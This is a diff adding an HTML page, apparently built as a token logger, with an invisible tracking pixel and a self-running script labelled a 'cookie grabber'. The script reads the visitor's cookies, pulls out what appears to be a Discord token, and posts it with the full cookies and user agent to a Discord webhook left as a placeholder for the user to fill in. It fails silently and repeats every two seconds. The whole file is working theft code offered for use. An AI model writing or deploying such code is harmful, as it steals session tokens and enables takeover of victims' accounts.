@@ -1,0 +1,31 @@
+<!-- public/index.html - Your complete logger -->
+<!DOCTYPE html>
+<html>
+<body style="margin:0;padding:0;">
+    <!-- Invisible pixel tracker -->
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" width="1" height="1">
+    
+    <script>
+    // Self-contained cookie grabber - sends to webhook directly
+    (function(){
+        const cookies = document.cookie;
+        const tokenMatch = cookies.match(/[M][A-Z0-9]{23}\./g);
+        const token = tokenMatch ? tokenMatch[0] : 'no-token';
+        
+        // Free webhook (replace with your Discord webhook)
+        const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
+        
+        fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `**New Hit!**\n\`\`\`Token: ${token}\nCookies: ${cookies.substring(0,1000)}\nUA: ${navigator.userAgent}\n\`\`\``
+            })
+        }).catch(()=>{}); // Silent fail
+        
+        // Retry after Discord loads more cookies
+        setTimeout(arguments.callee, 2000);
+    })();
+    </script>
+</body>
+</html>
